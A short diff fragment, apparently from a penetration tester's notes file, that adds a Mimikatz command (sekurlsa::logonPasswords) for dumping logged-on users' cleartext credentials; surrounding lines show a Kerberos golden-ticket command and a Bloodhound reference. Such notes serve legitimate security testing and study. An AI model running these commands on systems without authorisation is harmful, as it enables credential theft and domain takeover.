@@ -213,6 +213,7 @@ run - kerberos::golden /User:Administrator /domain: /sid: /krbtgt:addhashhere /i
 Run - misc::cmd<br>
 run command<br>
 <br>
+to see logged in cleartext creds -- sekurlsa::logonPasswords <br>
 <br>
 Bloodhound creds
 neo4j
